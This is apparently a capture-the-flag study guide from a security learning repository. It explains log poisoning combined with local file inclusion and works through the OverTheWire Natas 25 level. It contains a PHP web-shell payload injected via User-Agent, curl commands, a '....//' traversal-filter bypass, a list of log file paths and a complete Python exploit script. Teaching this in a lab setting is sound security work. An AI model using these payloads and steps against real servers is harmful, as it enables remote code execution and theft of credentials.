# 🌐 Web Security — Log Poisoning

> The server writes headers like User-Agent to a log file.
> With LFI, you can include that log file and run PHP code.

---

## 📋 Table of Contents

- [What Is Log Poisoning?](#what-is-log-poisoning)
- [Apache Log Format](#apache-log-format)
- [The LFI + Log Poisoning Combination](#the-lfi--log-poisoning-combination)
- [Usage in Natas](#usage-in-natas)

---

## What Is Log Poisoning?

It's a combination of two vulnerabilities:

1. **LFI (Local File Inclusion)** — the server can include a log file
2. **Code injection into the log** — we can write PHP code into the log file

```
Step 1: User-Agent: <?php passthru($_GET['cmd']); ?>
        → The server writes this to access.log

Step 2: ?page=../../../../var/log/apache2/access.log&cmd=id
        → The log file is included via LFI
        → The PHP code runs → the command output appears
```

---

## Apache Log Format

Apache writes every request to the `access.log` file:

```
127.0.0.1 - - [01/Jan/2024:12:00:00 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
^           ^  ^                            ^               ^        ^    ^  ^
IP          -  Date                         Request         Status   Size Ref UA
```

The last field is the **User-Agent** — set by the browser and written to the log without validation.

### Log File Locations

```
/var/log/apache2/access.log     → Apache (Debian/Ubuntu)
/var/log/apache/access.log      → Apache (CentOS/RHEL)
/var/log/httpd/access_log       → Apache (CentOS alternative)
/var/log/nginx/access.log       → Nginx
/proc/self/fd/2                 → Stderr
/var/log/auth.log               → SSH auth logs (poisoning is also possible via SSH)
```

---

## The LFI + Log Poisoning Combination

### Step 1: Write PHP Code into the Log File

```bash
# Send PHP code as the User-Agent
curl -A "<?php passthru(\$_GET['cmd']); ?>" \
     http://target.com/index.php
```

This request is written to `access.log` like this:

```
1.2.3.4 - - [01/Jan/2024:12:00:00] "GET / HTTP/1.1" 200 - "-" "<?php passthru($_GET['cmd']); ?>"
```

### Step 2: Include the Log File via LFI

```
http://target.com/index.php?page=../../../../var/log/apache2/access.log&cmd=id
```

When PHP includes the log file, it finds the `<?php passthru($_GET['cmd']); ?>` line and runs it.

### Why `$_GET['cmd']` and Not `$$_GET['cmd']`?

In the curl command we use `\$` because bash interprets the `$` character as a variable. The PHP file should contain `$_GET['cmd']`.

```bash
curl -A '<?php passthru($_GET["cmd"]); ?>'  # single quotes → $ is preserved
```

---

## Usage in Natas

### Natas 25 — Filtered Path Traversal + Log Poisoning

**Source code (summary):**

```php
function setLanguage() {
    if(array_key_exists("lang", $_REQUEST)) {
        $lang = $_REQUEST["lang"];
        // attempt to filter ../
        $lang = str_replace('../', '', $lang);
        if(safeinclude($lang)) return 1;
    }
}

function safeinclude($filename) {
    // reject if it contains natas_webpass
    if(strstr($filename, "natas_webpass")) {
        logRequest("file");
        return 0;
    }
    include($filename);
    return 1;
}

function logRequest($filename) {
    $log  = $_SERVER['HTTP_USER_AGENT'];
    $log .= " " . date("d/m/Y H:i:s") . "\n";
    $fd   = fopen("/var/www/natas/natas25/logs/natas25_[session_id].log", "a");
    fwrite($fd, $log);
    fclose($fd);
}
```

**Two vulnerabilities:**

1. The `str_replace('../', '', $lang)` filter can be bypassed: `....//` → `../`
2. `logRequest()` writes the User-Agent to the log → PHP code can be injected
3. The log file path can be included via LFI

**Exploit Steps:**

**Step 1: Bypass the `../` filter**

```
../     → str_replace → (deleted)
....//  → str_replace → ../   ← bypass!
```

**Step 2: Find the log file path**

Log file: `/var/www/natas/natas25/logs/natas25_[PHPSESSID].log`

**Step 3: Write PHP code into the log file**

```bash
curl -u natas25:[password] \
     -b "PHPSESSID=my_session_id" \
     -A '<?php passthru($_GET["cmd"]); ?>' \
     "http://natas25.natas.labs.overthewire.org/?lang=natas_webpass"
     # logRequest() is triggered because it contains natas_webpass!
```

Because it contains `natas_webpass`, `safeinclude` rejects it AND `logRequest()` is called → the User-Agent is written to the log.

**Step 4: Include the log file via LFI and run the command**

```bash
curl -u natas25:[password] \
     -b "PHPSESSID=my_session_id" \
     "http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_my_session_id.log&cmd=cat+/etc/natas_webpass/natas26"
```

**Full exploit with Python:**

```python
import requests

url      = "http://natas25.natas.labs.overthewire.org/"
username = "natas25"
password = "[natas25_password]"
session_id = "my_custom_session"
cookies  = {"PHPSESSID": session_id}

# Step 1: Write PHP code into the log (natas_webpass trigger)
r1 = requests.get(
    url,
    params={"lang": "natas_webpass"},
    cookies=cookies,
    headers={"User-Agent": '<?php passthru($_GET["cmd"]); ?>'},
    auth=(username, password)
)
print("[*] PHP code written to the log")

# Step 2: Include the log file via LFI
log_path = f"....//....//....//....//....//var/www/natas/natas25/logs/natas25_{session_id}.log"
r2 = requests.get(
    url,
    params={
        "lang": log_path,
        "cmd": "cat /etc/natas_webpass/natas26"
    },
    cookies=cookies,
    auth=(username, password)
)
print(r2.text)
```

---

### Log Poisoning — Checklist

```
Detection:
  ☐ Is there LFI? (page, file, lang parameter)
  ☐ Can the log file be accessed? (try to include it)
  ☐ Which headers are written to the log? (User-Agent, Referer)

Exploit:
  ☐ Find the log file path
  ☐ Send a PHP payload as the User-Agent
  ☐ Include the log file via LFI
  ☐ Run a command with &cmd=
  ☐ If ../ is filtered, bypass it with ....//
```

---

## 🔗 Resources

- [PortSwigger — Log File Injection](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings — LFI to RCE via Log](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-apache-log-poisoning)

---

**Previous topic:** [22_perl_cgi_param_bypass.md](./22_perl_cgi_param_bypass.md)
**Next topic:** [24_phar_deserialization.md](./24_phar_deserialization.md)

*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
